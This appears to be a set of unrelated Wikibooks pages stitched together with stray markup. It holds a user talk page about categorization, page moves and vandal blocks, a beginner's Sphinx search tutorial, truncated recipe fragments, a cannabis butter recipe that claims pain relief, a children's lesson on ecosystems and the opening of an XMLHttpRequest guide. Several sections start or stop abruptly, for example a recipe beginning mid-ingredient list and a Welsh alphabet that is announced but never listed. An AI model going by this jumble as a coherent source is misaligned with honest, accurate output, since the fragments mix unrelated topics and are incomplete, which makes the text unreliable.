:That's fine with me. If only it were so easy to make everyone happy with a love child from the mating of bookshelves and subjects; that'd make my day. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 13:53, 7 July 2009 (UTC)


== Category:University level mathematics books ==

Hi, I was curious why this was set to a hidden category? [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 10:13, 8 July 2009 (UTC)
:My rationale was that it is used like the alphabetical, DDC, and LOC classifications and doesn't correspond to an actual subject page like the subjects applied in addition to university level mathematics on the books.  This was stemming from your comment about certain categories showing up that weren't subjects. I think it was the featured book category. Making these categories hidden, to me, would solve that problem that you brought up. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 12:01, 8 July 2009 (UTC)
::Ah, I see.  Well, it doesn't quite solve the problem for me.  I have been complaining about these links at the bottom of the page for a while.  There is another aspect of my discontent I probably expressed best before you started.  Supose we fix everything else and we give our users a well defined notion of what a subject page is, and they use them.  Well then when they visit a book and see a link that Says &quot;Subject:Mathematics&quot; and they click on mathematics, they are taken to the category page!?!  If it were up to me I would keep things like &quot;Featured books&quot;, &quot;Books to be Merged&quot; etc at the bottom of the page, and just change the word to Categories, because that is where the links take you. [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 12:41, 8 July 2009 (UTC)
:::I wouldn't have a problem with that. Buy-in would be needed from Darklama, as he originated the change in order to habituate users into thinking of the links at the bottom as corresponding to subjects (though, indeed, they do not link to subjects). This is why I made sure to at least link to the subjects from the categories. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 12:50, 8 July 2009 (UTC)
::::I am glad to hear you linked the subjects for the categories, that I agree is a step in the right direction.  I have talked with Darklama about this, just recently in the IRC channel, he still sees it as a step in the wrong direction. Oh well. [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 13:06, 8 July 2009 (UTC)
::::: Do you have any strong feelings about me unhiding it? [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 10:02, 9 July 2009 (UTC)
::::::I don't really have feelings either way. It's just a cosmetic adjustment. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 14:39, 9 July 2009 (UTC)

== Help ==

I play DnD and bevlieve its wikibook is horribly unfinished.  In my renovating/finishing of it, i need to rename a page. Could you please rename [[Dungeons &amp; Dragons/Attributes|Attributes]] '''Ability Scores'''? And possibly tell me how for the future? --[[User:White wizard|White wizard]] ([[User talk:White wizard|talk]]) 22:32, 8 July 2009 (UTC)

: I'm glad you found the book. I had added it to a category a short while ago so that people could find it. Your page has been renamed. Normally you can't do this unless you've made some edits and been around for a few days. You satisfy both, so in the future you are able to rename a page by clicking on the tab at the top of the page titled &quot;move&quot; and entering in the new name. Please remember to update any links to the page by checking &quot;what links here&quot; in the toolbox at the lower-left hand side of the page. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 01:33, 9 July 2009 (UTC)

Thank you, and good job on administrator :) --[[User:White wizard|White wizard]] ([[User talk:White wizard|talk]]) 12:21, 9 July 2009 (UTC)

== Regarding [[Mac OS X Tiger]] ==

The merge was already done in 19 December 2008 by myself (hence the tagging for speedy) that was questioned as a VFD. Since the outcome seems to be a merge I take it is to the pending request to merge the pages edit histories...&lt;br&gt;
I don't object to the removal of the VFD tag but since no work was added to the page, then a notice of some kind should substitute the VFD (or a retag as speedy with the request to merge the histories, mentioning the VFD discussion so we don't get into the loop again). If no one is doing the requested/required edit history merge and immediate deletion soon...&lt;br&gt;
For the last comment from Darklama on the VFD he &quot;I'll do just that in a week...&quot; (1 June), I take he forgot about it...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 04:45, 9 July 2009 (UTC)

== Jeep Wrangler ==

Hey, just wanted to clarified why I marked [[Automobile_Repair/Jeep/Jeep_Wrangler]] for speedy deletion: It was its own book without any context, so I figured it was created out of confusion for how wikibooks is organized or what it is for (since it is just a listing of the parts).

Hey, if it is not a big deal, let me categorize its pages.  I have worked quite hard on it and would like to be the one to &quot;put the nails in the coffin&quot;. [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 19:47, 12 July 2009 (UTC)

== Thoughts ==

Do you have any thoughts about where [[Programming/LearnByExample/COpenGL/IntroOrtho]], [[Programming/PHP/Smart-links to Mediawiki pages]], and [[Programming/J2ME]] should go?  It seems there was a book titled Programming which got split into several books, and these pages got lost in the process.  But I am not sure where to put them now, and thought you might have some good ideas. Judging from how other books got split Programming/PHP probably became PHP Programming, similarly with J2ME Programming, but I am not sure if there is anything that corresponded to LearnByExample. [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 20:20, 19 July 2009 (UTC)

: The first was part of a book nominated by the author for speedy deletion and that page was missed. See the [http://en.wikibooks.org/w/index.php?title=Wikibooks:Votes_for_deletion&amp;diff=prev&amp;oldid=707982 VFD discussion]. The second is not used by [[PHP Programming]] or [[Complete PHP Programming]] and does not fit into either's structure, so I deleted it, as it is an obscure code sample by an anonymous user that did not make other contributions that would indicate it has any place in the existing books.  I did a history merge with [[J2ME Programming]] for the last one. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 23:53, 19 July 2009 (UTC)

== Accidental Page corrections ==

Hello Adrignola,

I am an instructor with a course at Old Dominion University in Norfolk, VA.  Our students have been writing Wikibooks for the past three years.  Our current book is titled Foundations and Asssessment of Education -- Edition 1. A student brought to my attention that you have added pages that I had intentionally deleted from another module page.  I am sure this is accedidental, but I would appreciate if you could contact me if you have any questions regarding our book.  We make modifications throughout each semester because we rate the topics and vote on the best of the two articles.  We appreciate all the hard work you all do as admins, so thank you for looking out. I am going back in and correcting these changes now. PLease let me know if you made any other changes, so that I can catch them before the students do. If you have any questions, please feel free to contact me.  Have a wonderful day! [[User:Jkauf007|Jkauf007]] ([[User talk:Jkauf007|talk]]) 19:59, 15 July 2009 (UTC)

I am sorry to ask, but could you please undo your edits to the book, Foundations and Assessment of Education -- Edition 1.  It seems that I do not have that priveledge. I messed up Chapter 5 trying to correct your change. It needs to be done as soon as possible, because students don't know what articles to read.  Thank you again for all of your help! [[User:Jkauf007|Jkauf007]] ([[User talk:Jkauf007|talk]]) 20:08, 15 July 2009 (UTC)

:Sorry about that. I should have asked before adding them to your pages in retrospect. I've fixed it so that only the articles that were originally linked are the ones linked on those pages. The pages that were added were not linked to by any page in the wiki and I was not aware that this was intentional.  Would you like the &quot;runners-up&quot; so to speak deleted? The only downside to the current state of your book is that those pages are not linked to and so will be hard to find.  I'm committed to having my edits be positive in their effect. If I can be of assistance in the future, please let me know. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 21:04, 15 July 2009 (UTC)

No problem! What we had originally designed was a separate module page called &quot;Content Articles.&quot;  The students read and rated these articles; we calculated their ratings and determined the &quot;winner.&quot; Once we had a winner, I just moved the links onto the main chapter page and technically deleted the module page called &quot;Content Articles.&quot; I realize now that in the hierarchy of the link structure, &quot;Content Articles&quot; is still included.  If I were to remove that part of the hierarchy, I would then have to re-post all of those articles onto new pages. In order to not totally rebuild the book throughout the semester, we would like to keep it this way.  Is this going to be alright? Thanks again for your help and quick response! [[User:Jkauf007|Jkauf007]] ([[User talk:Jkauf007|talk]]) 01:04, 16 July 2009 (UTC)

That sounds fine to me.  You do have a second option. You could move the pages directly under the chapter name and request the &quot;content articles&quot; module be deleted. But that'd be about as much work as re-posting the articles. Whatever works best for you works for me. After all, it's you and your students' pride and joy. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 01:43, 16 July 2009 (UTC)

Hello again,

In Chapter 10, [[Foundations and Assessment of Education/Edition 1/Foundations Table of Contents/Chapter 10|'''Chapter 10 -- Effective Teaching''']] two of the articles were erased and are currently blank links; 10.3.1 and 10.4.1.  When UI went to look at my old content page to replace them, it seems that the page has been erased.  Is this correct?  I need the two articles posted back, and it would be helpful if I could assess my old pages in case issues arise. Thank you for your assistance! [[User:Jkauf007|Jkauf007]] ([[User talk:Jkauf007|talk]]) 15:11, 23 July 2009 (UTC)

: The only author of those pages, [[User:Mhanz001|Mhanz001]] had emptied them of content, qualifying them for speedy deletion.

== categorization of Spanish by Choice ==

Thanks for categorizing the pages of the &quot;Spanish by Choice&quot; book. I've seen that you stopped categorizing the templates. I think there are some dozens of them; all easily identified by the prefix &quot;Sbc&quot;. Do you think it is necessary to categorize them? --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 08:32, 23 July 2009 (UTC)
:Always happy to help. I wasn't aware that there were more templates. I will have to take care of the rest. It is not ''technically'' necessary to categorize them, but it cuts down on the listing at [[Special:UncategorizedTemplates]].  Doing this is less for categorizing templates specific to a book and more for categorizing templates that can be used by any book.

== Removal of Single page version ==

As an editor I find it very useful to be able to manage all the content of the book in its fullness so to construct a well structured work because of this having an all pages version (similar to but not equal to the print version) is required as it can have the TOC enabled and doesn't require a copy o the GFDL...&lt;br&gt;

: The link to the all chapters page has been restored.  If the book is licensed under the CC-BY-SA license, it won't need a copy of the GFDL in the print version, but the print version has it in there at this point.  If it is licensed under CC-BY-SA, then your all chapters page will end up identical to the print version.  -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 20:48, 28 July 2009 (UTC)
::For what I understood of the licensing issue (I have attempted to clarify this recently) the works will be dual licensed (something that causes me confusion since I thought that the idea was to drop the GFDL altogether, but it is the text that contributors are now seeing on edits). This makes opting out of the GFDL impossible and so it continues to be a requirement that the license text be added to intended for print outputs.

::PS: Is there a Creative Commons Attribution/Share-Alike License 3.0 tag or one that reflects this new dual license reality (similar to the one used for the GFDL [[Video Game Design/Authors]]) ?  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 03:09, 29 July 2009 (UTC)

:::{{tlx|cc-by-sa-3.0}} would be the tag you want or anything in [[:Category:Wikibooks copyleft templates]].

== &quot;Good site&quot; bots ==

Hi Aaron,

The edit you reverted to [[XQuery/Uptime monitor]] earlier today fits the pattern of what we call the &quot;Good site, admin&quot; bot.  Typically, these bots replace a section of a book with some sort of lame compliment.  When I see these, I block them indefinitely and log their IP's on [[User talk:Mike.lifeguard#.22Good_site.2C_admin.22_bot|Mike's talk page]] so he can block them on other wikis.  I do not leave messages for them either, as it is completely pointless since the bots don't (and can't) read.  Be on the lookout! --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 17:28, 29 July 2009 (UTC)

: Looking at your blocks today, they use a pretty wide range of IPs.  Pretty nefarious.

I am wondering what you think of this. I have it all figured out.

*First is the Library.
*Under that are sections
*Within those are sub-sections and subjects
*Within the subjects are books.

Does that sound right. The current system is worse than the bookshelves. [[User:Arlen22|Arlen22]] ([[User talk:Arlen22|talk]]) 13:14, 30 July 2009 (UTC)

== Recusal and Block Request ==

[[User:Kittins_floating_in_the_sky_yay|Kittins_floating_in_the_sky_yay]] [[Special:Contributions/Kittins_floating_in_the_sky_yay|(contribs)]] started out making some defensible contributions to Wikibooks, but then quickly descended into attacking [[Adventist Youth Honors Answer Book]].  He has twice replaced the content of the front page with text asserting &quot;brainwashing cult&quot; spaced over a period of four weeks or so.  I believe these actions merit a lengthy (perhaps indefinite) block.  I could block this user myself, but I would like to recuse myself on the grounds that I am highly biased.  [[Adventist Youth Honors Answer Book]] is a project on which I have spent literally thousands of hours developing.  I elect to not determine the block period, as I don't think I can do so fairly.

== Request for test ==

I am seeking some help testing a helper script I have written that supports a template I have also written. Some background - I am currently planning a book that I intend to write for Wikibooks. During this planning process, I decided that the existing tools for referencing and citing textual sources in a wikibook do not meet my needs. Specifically, the &lt;nowiki&gt;&lt;ref&gt; and &lt;references /&gt; &lt;/nowiki&gt; tags provided by the cite extension require a reference and citation to exist on the same wiki markup page. This condition rarely obtains for books. Books are long, comprise many pages and the rendering of citation and footnote text generally occurs on a wiki page other than where the citation or footnote reference occurs.

So, I decided to create a template, called Bref, that uses the cite extension in a way that allows the separation of text source and footnote references from citation and footnote data. However, the cite extension &lt;nowiki&gt;&lt;reference /&gt; &lt;/nowiki&gt; tag creates back links to references. In order to separate references and reference data so they may exist on different pages, Bref renders these back links meaningless (more details about this is found on the [[User:Dnessett/Template/Bref/doc | Bref documentation page]]). Consequently, I created a helper script that effectively deletes these back links. I have tested the helper script myself, but would like at least one other user to test it to ensure I have not hardwired something into the script that means it works for me, but not for anyone else. Instructions for using the helper script are found at [[User:Dnessett/Template/Bref/doc#Cleaning Up Meaningless Back Links (Bref Helper Script) | helper script instructions]]. For the cautious, the script is located at [[User:Dnessett/Template/Bref/Clean Back Links.js]]. It is pretty simple and a moderately experienced javascript programmer should see it is not harmful. The easiest way to determine that the helper script is working is to go to the [[User:Dnessett/Bref_Examples | Bref examples page]] and render one of the footnote or reference pages. Good candidates are the references pages for Example 1 and Example 4. If the helper script is working properly, no back links should appear at the beginning of each entry.

== Request to Nuke duplicate pages ==

I created a duplicate subtree of some pages in my namespace and would like an admin to nuke the old version. The reason I didn't move the subtree is I needed to edit most of the pages to conform to their new location. So, I copied them from my personal wiki after the modifications. I know I can put a quick delete template on all of the old pages, but there are approximately 30 and that would take a lot of time. The subtree that should be deleted is the one based at Dnessett/Template/Bref/Examples. Thanks. [[User:Dnessett|Dnessett]] ([[User talk:Dnessett|talk]]) 21:20, 26 June 2009 (UTC)

Thanks. You missed two (Dnessett/Template/Bref/Examples/Example3/Chapter1/Markup Page 2 and Dnessett/Template/Bref/Examples/Example3/Chapter1/Markup Page 3). However, you saved me a great deal of time in deleting the others for which I am grateful. I have placed speedy delete templates on the two remaining pages.

      <text xml:space="preserve">{{wikipedia|Sphinx (search engine)}}
If you are somebody that doesn't know much about indexes, APIs, and configuration files it's a pretty good indication that you should read this book. Unlike the official documentation, this book explains certain things that the documentation thinks you should know already. Note that I will focus mostly on the PHP API throughout this book, since I'm best at that language, but you can use Sphinx with pretty much any language imaginable.

=== Why Use Sphinx? ===
You might be asking yourself, why bother use Sphinx? It seems to be more trouble than it's worth. 

* '''Speed''': The key reason is SPEED. Your regular MySQL searches take a SIGNIFICANTLY longer time to execute than a Sphinx search. You will start noticing the difference once your database has millions of records. If you have a small database (ex: forum of 100 users), will it be of any help? Not really...It's still fun to experiment with though! Plus there are cool features like word morphology (if I am searching for cats it will match cat, if I'm searching for running it will match run, runs, runable (I think...), etc.)
* '''Search Features''': Another reason is search features. Ever wonder when you search for 2 words in Google, it will look for them in the same paragraph or 2 paragraphs (or sentence) but not all the way across the page? Sphinx allows you to do similar things :)
* '''Scalability''': If you have big big databases on many many servers Sphinx will take care of it. And it will make it seem to the application that it's looking at one server. Sphinx can take a lot of stress off the PHP servers in terms of handling and searching information.

=== What Is Different About Sphinx? ===
Sphinx is a little bit different from what you are used to with MySQL queries. So don't expect to get it instantly.

==== Indexing ====
===== What Is Indexing? =====
Sphinx retrieves data from a table in a MySQL database and performs a process called ''indexing'' on it. Indexing creates a file that is easily searchable by Sphinx. For example, if you try to search a document in Microsoft Word it will search for words one by one in the document text. In a very large document searching can be noticeably slow. On the other hand, Sphinx indexes before any searches take place. This creates an index which can be efficiently searched instead of searching the entire document word by word. A good example is an encyclopedia index. If I want to find some information about cats, I could do what Microsoft Word does and read every page in the encyclopedia looking for the occurrence of the word &quot;cat&quot;. Or I can look in the back, under cat, ah pages 104, 195, and 653. Much easier.

{{TODO|explain what happens during indexing}}

===== You Can Only Search What is Indexed =====
What you need to remember is that '''SPHINX CAN ONLY SEARCH WHAT IS IN THE INDEX!''' That means that every time you want to search the latest results, you must update the index. So if you were writing an article about cats and indexed the article table, then wrote an article about chickens, and did a search it would find your cat article, but it would treat the chicken article as if it never existed.

If you remember one thing from this section, it's that '''SPHINX CAN ONLY SEARCH WHAT IS IN THE INDEX!'''

==== Accessing Data ====
If you used PHP with MySQL this will be a lot easier for you. Otherwise you should probably consider learning PHP and MySQL (or anything and MySQL for that matter). There are great tutorials on Tigzag and W3Schools. 

===== Sphinx normally returns MySQL ids, not data!!! =====
A key thing you need to remember about Sphinx is that it normally does NOT retrieve data. Primarily it retrieves document ids, so you might be wondering ''What the heck is Sphinx for then''? SEARCHING. Sphinx does the intensive part, which is searching for specific records. Then you can do the easy part through MySQL, which is retrieving that document. So for example, if Sphinx pulls out document ids 1, 5, and 7 from the index you will need to do a query in MySQL to retrieve the records (probably with ids of 1,5, and 7). You might think it's stupid, but it takes very few resources for MySQL to search for a document ID compared to searching for a word. 

Here's an example. Say Sphinx pulls out documents with ids 1, 5, 7. You would do 
&lt;source lang=sql&gt;SELECT * FROM documents WHERE id IN (1,5,7)&lt;/source&gt;
You are telling MySQL to select all the columns from the documents table (or whatever table the result was in) where the id (or whatever you called the id field) is either 1, 5, or 7. And then you can use mysql_fetch_array in PHP to look at the data and do whatever with it.

Once you learn how to use Sphinx for ordering your results, you can preserve the order by:
* Storing the order of the results in an array (just store the id property for matches)
* Doing a IMPLODE on the array using $result = implode(&quot;, &quot;, $array) where $array was your array of results, and result will store a string of your result ids separated by comma space.

&lt;source lang=sql&gt;SELECT * FROM documents WHERE id IN ($result) ORDER BY FIELD(id,$result)&lt;/source&gt;
Here we are telling MySQL to order the results by the id field in the order we specified in $result.

It might seem like a lot of work, but you'll get used to it, and eventually you'll write functions to handle all of this for you. Don't worry, it's totally worth it!!!

Pork chops seared hot then cooked slowly over hickory wood makes your mouth water just thinking about it, right?

== Ingredients ==
* 4 thick cut pork rib chops
* 1 cup salt
* 3/4 cup honey
* 2 cups hot apple cider vinegar
* 2 pounds ice
* 1 tablespoon cayenne pepper
* 2 tablespoons paprika
* 2 tablespoons ancho chili powder
* 1 tablespoon black peppercorns, cracked
* Olive oil
* Soaked hickory chunks 

== Procedure ==
#Combine salt, honey, and vinegar in a gallon-size zip-top bag. Add ice and shake until ice is mostly melted and mixture has cooled enough so that it doesn't cook the meat.
#Insert pork chops and refrigerate 1-2 hours.
#Drain pork and pat dry with paper towels. Discard remaining brine.
#Combine remaining seasonings and rub on both sides of each pork chop.
#Get your smoker ready. Place chunks in the firebox and keep the smoker at around 250 degrees F.
#Brush with olive oil and grill on high just until marked. Flip and repeat 1 more time.
#Move to smoker and insert a probe thermometer into one of them. Cover and cook until internal temperature reaches 140 degrees for medium rare, 155 for medium, and 165 for toast. Carry-over will take it the last 5 degrees.
#Move to a plate and let rest 5 minutes. Serve warm.</text>

== Noob Notes ==

Hallo Mattiasl,

nice that you are contributing to the [[Blender 3D: Noob to Pro]] book. A small wish from my side: I personally think that Noob-Notes are harmful. If you like to make a change to a page just go ahead and make corrections and additions that follow the general flow of the page. If you're not sure about these, add them to the discussions page of the module.

With kind regards --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 21:53, 21 July 2009 (UTC)</text>

==What writing system(s) does this language use?==

Welsh uses the Roman (English) alphabet, with the letters J, K, Q, V, X, and Z removed.  Welsh adds the &quot;letters&quot; CH, DD, FF, NG, LL, PH, RH, and TH.  Welsh also adds the circumflex (^) to mark a long vowel.  Therefore, Welsh has this 35-letter alphabet:

==No order.gif files still for some kanji==
I've left a couple kanji pics without out order.gif files because apparently they still don't exist. I'm trying to learn how to create them with very little success. Any help in this area is much appreciated. On another note some of the existing order.gif files are so fuzzy they could be redone so that they meet the quality of many of the other files.

* 1/2 tsp salt
* 2 quarts vegetable oil for frying
* Hazelnut Chocolate Dipping Sauce (recipe below)

== Procedure ==
#Place milk, eggs, salt, and sugar with the tortillas in a food processor and pulse until chunky paste is achieved.

#Roll tortilla mixture into 1 inch to 1 1/2 inch balls. Fry, 6-8 at a time, until crisp and golden brown, about 2-3 minutes.
#Drain on a cooling rack set above a sheet pan and let cool 1-2 minutes. Serve warm with Hazelnut Chocolate Dipping Sauce.

== Hazelnut Chocolate Dipping Sauce ==

===Ingredients===
* 1/4 cup hazelnut-flavored syrup
* 1/2 cup chocolate syrup
* 1 tbs pure vanilla extract

Adding your flavorings to the butter before you melt it is a great trick to keep butter sauces from separating. Adding cream is also a good way.

== Ingredients ==
* 4 (6-ounce) Coho salmon filets, skin on one side
* Salt and freshly ground black pepper
* Olive oil
* 1 stick unsalted butter
* Juice of 1/2 lemon
* A flame-resistant towel tied with twine and soaked in oil

== Procedure ==
#Brush salmon with olive oil and sprinkle liberally with salt and freshly ground black pepper. Set aside.
#Heat a large chimney starter's worth of charcoal briquets. Once hot, disperse evenly around the bottom of the grill and reapply the grate.
#Quickly lube the grate with the towel. (held with tongs of course) Add salmon filets, skin side down, and cook, covered, turning often, until fish is pink throughout and flakes easily when tested with a fork.
#Remove and keep warm.
#Fold together lemon and butter. Melt over medium heat in a large saucepan.
#Drizzle butter over filets and serve warm.</text>

#Heat a large stainless steel or cast iron skillet over high heat. Add pork chops and cook until browned and slightly charred on both sides.
#Remove and set aside.
#Place pan back on heat and deglaze with white wine. Pour out wine and reserve.

Serve this with pork chops, or as a dessert.

== Ingredients ==
* 2 Honeycrisp apples, cut into 1/2 inch wedges
* 1/4 cup granulated sugar
* 1/4 cup unsalted butter, divided
* 1 tsp freshly ground cinnamon
* 1/3 cup brandy
* Juice of 1/2 orange
* Pinch of salt

== Procedure ==
#Melt 2 tbs butter in a large stainless steel skillet over medium heat. Add apples and cook, tossing often, until lightly browned around edges. Remove and keep warm.
#Add sugar, salt, orange, and cinnamon to pan. Scrape with a metal whisk to loosen browned bits.
#Melt in butter, 1 tbs at a time, while whisking continuously. Once all butter has been melted, bring to a boil. (the fiercer the boil, the flashier the show).
#Add brandy and, if it hasn't ignited by itself, do so with a long match or a firestick.
#Add apples and cook 1-2 minutes. (depending on how soft you want your apples)
#Remove apples from pan and drizzle with sauce. Serve warm.</text>

== Ingredients ==
*1 top sirloin steak (also goes by the name: center cut, top butt, and hip)
*Salt and freshly ground black pepper
*Olive oil
*1 tbs unsalted butter, sliced thinly and brought to room temperature 
*Cabernet Butter Sauce (recipe below)

== Procedure ==
#Brush both sides of steak with olive oil and season liberally with salt and freshly ground black pepper. Set aside.
#Preheat your broiler. Place a rack in the highest position of the oven and one just below it. Place a sheet of aluminum foil that has been crimped around the edges on the lower rack.
#Place the steak on the upper rack. Insert a probe thermometer into the center of the steak and keep the oven door open with a tube of aluminum foil.

{{Warning|'''''In some counties possession of cannabis is prohibited.'''''}}

==Ingredients==
*200 g (7oz) [[Cookbook:Butter|butter]]
*[[Cookbook:Cannabis|Cannabis]]

==Procedure==
#Bring a pan of water to a boil.
#Add the butter and cannabis.
#Boil this for a few hours on a low heat.
#Cool down. The oils and the extracts in the marijuana are now dissolved.
#Separate the solids from the water. Store in a refrigerator or freezer to solidify butter further.

==Theory of the Process==
The active ingredients in the Cannabis are readily absorbed by fats. Therefore any fats can be used - lard, shortening, margarine... The unwanted portions of the cannabis are more readily absorbed into the water. These components are the color, the taste, and maybe chemicals that could be on the cannabis.

The finished Cannabis 'Fat' should have a slight green color with a slightly off taste from the cannabis.

==Uses==

This is a very good ingredient to make your favorite dishes. The Cannabutter simple replaces the butter, of fat ingredient, in the recipe.

It is can be used in this way as an excellent pain reliever for those suffering from cronic diseases causing pain. It gives a numbing 'body stone', rather than the cloudy 'head stone' one normally gets from smoking cannabis.

==Alternate Recipe==

A much faster method of making the cannabutter is to saute the finely ground cannabis in  fats just before the butter, fat, or oil is to be used for your favorite recipe. The solids are first removed before the other ingredients are added to the fats for frying. Excellent for stirfrys and the like.

This is method does away with the water, which is a controversy with this recipe.

Yes, all those grilling websites say sirloin isn't that tender, but they're probably talking about bottom sirloin. Top sirloin is almost as good as a ribeye. It's juicy, tender, and flavorful.

== Ingredients ==
*1 top sirloin steak (also known as a top butt and center cut sirloin steak)
*Salt and freshly ground black pepper
*Olive oil

== Directions ==
#Place a rack in the upper third of the oven and another right below it. Place a tray of aluminum foil on the lower rack. Preheat your broiler.
#Brush steak on both sides with olive oil. Season both sides liberally with salt and freshly ground black pepper.
#Place the steak on the upper rack. Insert a probe thermometer into the thickest part of the steak. Keep the oven door slightly open with a tube of foil and cook until internal temperature reaches 140 degrees F for medium rare, 155 for medium, and 165 for toast.
#Remove to a plate and cover with aluminum foil. Let rest 7 minutes before slicing on the bias across the grain. Serve warm.</text>

      <text xml:space="preserve">What is an ecosystem? Well, before we try and answer this question, we need to answer what a climate is to help us. So what is a climate? Weather is unpredictable: even in the Sahara, a hot, dry place, it can snow- the characteristic of a cold, wet place; and in the U.K it can be hot and sunny! But a climate is more long-term; it is the '''Average''' weather over a long period of time. For example, the Amazon is usually warm and wet, so it has a warm and wet climate. But extremes (unusual weather for the area) are also important; for example, if you wanted to build a house, you would want to know what the 'Worst weather in a 100 years is', so you can install the right defences. Ecosystems are areas that have similar characteristics on a large-scale. 

==World climatic zones==
The Earth is divided into a number of World Climatic Zones, Ecosystems. There are a number of ecosystems that we are going to look at and describe some features. 

===Desert===
Deserts have a hot, dry climate, with under 250mm of rainfall of every year. With almost no humidity or cloud cover, the Deserts suffer temperature extremes: hot days and cold nights. They are usually found in the Middle latitudes, away from the moisture of the tropics and the cold of the Arctic; '''but''' the Arctic is a desert itself'. It is known as a 'cold desert'- dry enough to be a desert but without hot daytime temperatures. Creatures living in the desert are very adaptable, as they must be able to cope with extremes of temperature and the dry conditions. The Cactus is a desert plant, without real leaves so it saves reason, and prickles for the same reason and for protection against desperately hungry animals. 

===Rainforest===
Rainforests are usually more South from Deserts, but temperatures are not as hot in the day, thanks to moisture, cloud cover and tree cover. Temperatures are usually more balanced, unlike the extremes of a Desert. There are lots of vegetation and wildlife, as there is never a lack of water and temperatures are balanced. But a cactus wouldn't be able to live in a rainforest, as it is designed to get as much water as possible- not an ideal skill in a Rainforest!

===Temperate===
Temperate Rainforests have even more life than their tropical counterparts, despite being less famous. The U.K and most of Europe and North America has a Temperate climate- with warm summers, cool winters, and rather balanced rainfall- these conditions are very stable, therefore being home to many forms of life. Temperate life doesn't normally need any specific features to help it cope with its surroundings (unlike a cactus). Hedgehogs are temperate animals with fur- a good insulator from the cold winters and spikes (like a cactus) to protect itself' from potential predators. 

===Polar===
Polar ecosystems are cold and dry- dry meaning very little snow, despite the cold. Cold air holds less water vapour than warm air, making snow a rare event even up North. Polar animals have to be very adaptable to survive- especially in the Arctic where ice is commonly melting. The Polar Bear is a very adaptable animal- it can swim, has a thick layer of blubber for warmth, and it is designed for hunting, instead of having trouble finding the little vegetation there is. 

===Mountainous===
Vostock Station in Antarctica experienced the coldest ever recorded because of its' polar conditions and its' high altitude. As well as the cold as you increase in altitude, the lack of oxygen is another factor that limits life on the mountain. However, the mountain can offer factors like camouflage that support life. The habitat of a mountain changes with altitude: high up there is a snow-line, with a permanent layer of snow that almost nothing can exist in. Some plants can live over 5000m up a mountain, but they must have extremely good adaptions. 

==Other Ecosystems==
There are a number of other important ecosystems to mention, including: 

===Ocean===
We should perhaps call our planet ''Planet Ocean'', as over half our planet is ocean. Life in the Ocean has existed far more than in land, and life there is perhaps even more amazing. Corals and fish cramp the warm, tropical waters of the Coral Reef; and we know less about the bottom of the ocean than the surface of the moon: where freezing temperatures, extreme pressure and very hardy- but rare and scattered- life exists, clinging to any possible thing to sustain them: Hydrothermal Vents. 

===Urban===
Why not turn off your PSP and look out your doorstep? The Urban landscape offers more than being bored stiff! There are plenty of Pigeons scavenging littered chips and Frogs croaking round the waterside. But factors such as Pollution and Acid Rain make the Urban Landscape hard to gain a foothold on.  

==Quiz==
# What is the Ecosystem the photograph is set in? 
# What is the climate of the ecosystem? 
# Which latitudes does this ecosystem tend to be found? 
# Name a plant in the picture and explain how it adapts to its habitat

==Answers==
# Desert
# Dry with extremes of temperatures
# Mid-latitudes
# (one example) A Cactus adapts to its' habitat by having little leaves which reduces evaporative loss.

      <text xml:space="preserve">This is a guide and reference to the XMLHttpRequest object, a key component to know in [[Programming Ajax|Ajax programming]]. 
== Example ==
Here is a brief example of a web page that uses XMLHttpRequest. We'll get into the details and ways to work-around various things that can go wrong later.

&lt;source lang=&quot;javascript&quot;&gt;
&lt;html&gt;&lt;!-- example.html : public domain --&gt;
&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot; &gt;
function alertContents(httpRequest){
    if (httpRequest.readyState == 4){
        // everything is good, the response is received
        if ((httpRequest.status == 200) || (httpRequest.status == 0)){
            // FIXME: perhaps a better example is to *replace* some text in the page.
            var htmlDoc=document.createElement('div'); // Create a new, empty DIV node.
            htmlDoc.innerHTML = httpRequest.responseText; // Place the returned HTML page inside the new node.
            alert( &quot;The response was: &quot; + httpRequest.status + httpRequest.responseText);
        }else{
            alert('There was a problem with the request. ' + httpRequest.status + httpRequest.responseText);
        }
    }
}

function send_with_ajax( the_url ){
    var httpRequest = new XMLHttpRequest();
    httpRequest.onreadystatechange = function() { alertContents(httpRequest); };  
    httpRequest.open(&quot;GET&quot;, the_url, true);
    httpRequest.send(null);
}
&lt;/script&gt;

&lt;p onClick=&quot;send_with_ajax('example.html');&quot;&gt;
Click me!
&lt;/p&gt;
&lt;/html&gt;
&lt;/source&gt;

==Object reference==
===Methods===
&lt;dl&gt;
